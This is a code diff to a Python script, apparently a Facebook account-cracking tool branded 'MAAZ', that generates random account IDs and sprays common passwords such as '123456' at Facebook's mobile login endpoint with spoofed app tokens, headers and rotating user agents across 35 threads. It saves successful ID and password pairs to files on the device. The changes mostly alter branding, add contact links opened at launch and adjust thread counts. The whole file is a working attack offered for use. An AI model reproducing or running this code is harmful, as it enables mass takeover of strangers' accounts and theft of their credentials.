@@ -3,7 +3,7 @@ import datetime
 from bs4 import BeautifulSoup
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from concurrent.futures import ThreadPoolExecutor as ThreadPool 
 import uuid,base64,hashlib,zlib,subprocess,time,platform,_socket,ssl,certifi
 import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
 from concurrent.futures import ThreadPoolExecutor as tred
@@ -599,9 +599,9 @@ for xd in range(10000):
    l='JioBrowser/1.4.7 Chrome/69.0.3497.100 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
-	
-os.system('xdg-open https://whatsapp.com/dl/code=fnX8DX7gh1?mode=c')
-os.system('xdg-open https://chat.whatsapp.com/CFGuz089SUe5npFZDS8iTh?mode=r_c')
+   
+os.system('xdg-open https://www.facebook.com/profile.php?id=100004682100211 ')
+os.system('xdg-open https://wa.me/923079741690')
 
 def linex():
     print(f'\r\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
@@ -612,6 +612,7 @@ def line():
 # Logo
 logo = f"""
 \033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+
     ███╗░░░███╗░█████╗░░█████╗░███████╗
     ████╗░████║██╔══██╗██╔══██╗╚════██║
     ██╔████╔██║███████║███████║░░███╔═╝
@@ -636,20 +637,22 @@ os.system('clear')
 os.system('espeak -a 300 "well,come to,MAAZ, tools"')
 logo = f"""
 \033[0;92m
-      ███╗░░░███╗░█████╗░░█████╗░███████╗
-      ████╗░████║██╔══██╗██╔══██╗╚════██║
-      ██╔████╔██║███████║███████║░░███╔═╝
-      ██║╚██╔╝██║██╔══██║██╔══██║██╔══╝░░
-      ██║░╚═╝░██║██║░░██║██║░░██║███████╗
-      ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝
+
+    ███╗░░░███╗░█████╗░░█████╗░███████╗
+    ████╗░████║██╔══██╗██╔══██╗╚════██║
+    ██╔████╔██║███████║███████║░░███╔═╝
+    ██║╚██╔╝██║██╔══██║██╔══██║██╔══╝░░
+    ██║░╚═╝░██║██║░░██║██║░░██║███████╗
+    ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝
 \033[0;92m               \033[0;92m
 
-\33[0;41m      [ IF NO WORKING INTERNET THEN USE FAST OR OTHER VPN THANKS ]       \033[0;92m
+\33[0;41m      [ Use VPN For More Internet Speed ]       \033[0;92m
 
 \33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mFACEBOOK   \33[38;5;160m▶  \033[1;97m MAAZ 🔥
+\33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mFACEBOOK   \33[38;5;160m▶  \033[1;97mMohmmad MAAZ 🔥
+\33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mWHATAPP    \33[38;5;160m▶  \033[1;97m03079741690
 \33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mFEATURE    \33[38;5;160m▶  \033[1;97mOLD CLONE 
-\33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mVERSION    \33[38;5;160m▶  \033[1;97m1.6
+\33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mVERSION    \33[38;5;160m▶  \033[1;97m2.1
 \33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
 
 def clear():
@@ -678,14 +681,14 @@ def main():
 def __Old1__():
     user=[]
     clear()
-    print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
+    print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m50000\33[38;5;37m|\033[1;97m99999')
     linex()
     limit=input(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
     linex()
     year_code = '100000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
-    with tred(max_workers=30) as jihad:
+    with tred(max_workers=35) as jihad:
         clear()
         print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
         print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
@@ -693,18 +696,19 @@ def __Old1__():
         for mal in user:
         	uid=year_code+mal
         	jihad.submit(login1,uid)
-        
-def __Old1__():
+    line();print(f'\r\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()
+
+def __Old2__():
     user=[]
     clear()
-    print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
+    print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m50000\33[38;5;37m|\033[1;97m99999')
     linex()
     limit=input(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
     linex()
     year_code = '10000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
-    with tred(max_workers=30) as jihad:
+    with tred(max_workers=35) as jihad:
         clear()
         print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
         print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
@@ -714,51 +718,31 @@ def __Old1__():
             jihad.submit(login2,uid)
     line();print(f'\r\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()
 
-def __Old2__():
-    user=[]
-    clear()
-    print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
-    linex()
-    limit=input(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
-    linex()
-    year_code = '10000'
-    for i in range(int(limit)):
-    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
-    with tred(max_workers=30) as jihad:
-        clear()
-        print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
-        print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
-        linex()
-        for mal in user:
-            uid=year_code+mal
-            jihad.submit(login3,uid)
-    line();print(f'\r\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()
-
 def __Old3__():
     user=[]
     clear()
-    print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶\033[1;97m 10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
+    print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶\033[1;97m 10000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m50000\33[38;5;37m|\033[1;97m99999')
     linex()
     limit=input(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
     linex()
     year_code = '10000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
-    with tred(max_workers=30) as jihad:
+    with tred(max_workers=35) as jihad:
         clear()
         print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
         print(f'\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
         linex()
         for mal in user:
             uid=year_code+mal
-            jihad.submit(login4,uid)            
+            jihad.submit(login3,uid)            
     line();print(f'\r\33[38;5;160m[\033[1;97m👍🏻\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()
 
 def login1(uid):
     global oks,loop,cps
     Session=requests.session()
     try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\33[38;5;37m-\x1b[38;5;46mB1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
+        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\33[38;5;37m-\x1b[38;5;46mB1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
@@ -806,7 +790,7 @@ def login1(uid):
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/maaz-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
@@ -817,7 +801,7 @@ def login2(uid):
     global oks,loop,cps
     Session=requests.session()
     try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\33[38;5;37m-\x1b[38;5;46mB2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
+        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\33[38;5;37m-\x1b[38;5;46mB2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
@@ -862,12 +846,12 @@ def login2(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/maaz-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/maaz-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
@@ -875,67 +859,6 @@ def login2(uid):
         loop+=1
     except Exception as e:time.sleep(30)
 def login3(uid):
-    global oks,loop,cps
-    Session=requests.session()
-    try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\33[38;5;37m-\x1b[38;5;46mB3\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
-        sys.stdout.flush()
-        ua = random.choice(ugen)
-        ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
-            data = {'adid':str(uuid.uuid4()),
-            'format': 'json',
-            'device_id':str(uuid.uuid4()),
-            'cpl': 'true',
-            'family_device_id':str(uuid.uuid4()),
-            'credentials_type': 'device_based_login_password', 
-            'error_detail_type': 'button_with_disabled', 
-            'source': 'device_based_login', 
-            'email':str(uid),
-            'password':str(pw),
-            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
-            'generate_session_cookies': '1', 
-            'meta_inf_fbmeta': '', 
-            'advertiser_id':str(uuid.uuid4()),
-            'currently_logged_in_userid': '0', 
-            'locale': 'en_US',
-            'client_country_code': 'US', 
-            'method': 'auth.login', 
-            'fb_api_req_friendly_name': 'authenticate', 
-            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
-            'api_key': '882a8490361da98702bf97a021ddc14d'}
-            head = {'User-Agent': ua,
-            'Content-Type': 'application/x-www-form-urlencoded', 
-            'Host': 'graph.facebook.com', 
-            'X-FB-Net-HNI': '25227',
-            'X-FB-SIM-HNI': '29752',
-            'X-FB-Connection-Type': 'MOBILE.LTE', 
-            'X-Tigon-Is-Retry': 'False', 
-            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
-            'x-fb-device-group': '5120', 
-            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
-            'X-FB-Request-Analytics-Tags': 'graphservice', 
-            'X-FB-HTTP-Engine': 'Liger', 
-            'X-FB-Client-IP': 'True', 
-            'X-FB-Server-Cluster': 'True', 
-            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
-            'Content-Length': '706'}
-            url = "https://b-graph.facebook.com/auth/login"
-            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
-            if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/maaz-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
-                cps.append(uid)
-                break
-            elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/maaz-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
-                oks.append(uid)
-                break
-            else:continue
-        loop+=1
-    except Exception as e:time.sleep(30)
-def login4(uid):
     global oks,loop,cps
     Session=requests.session()
     try:
@@ -964,7 +887,7 @@ def login4(uid):
             'method': 'auth.login', 
             'fb_api_req_friendly_name': 'authenticate', 
             'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
-            'api_key': '882a8490361da987021ddc14d'}
+            'api_key': '882a8490361da98702bf97a021ddc14d'}
             head = {'User-Agent': ua,
             'Content-Type': 'application/x-www-form-urlencoded', 
             'Host': 'graph.facebook.com', 
@@ -984,16 +907,16 @@ def login4(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/maaz-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/maaz-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
         loop+=1
     except Exception as e:time.sleep(30)
-main() 
+main()
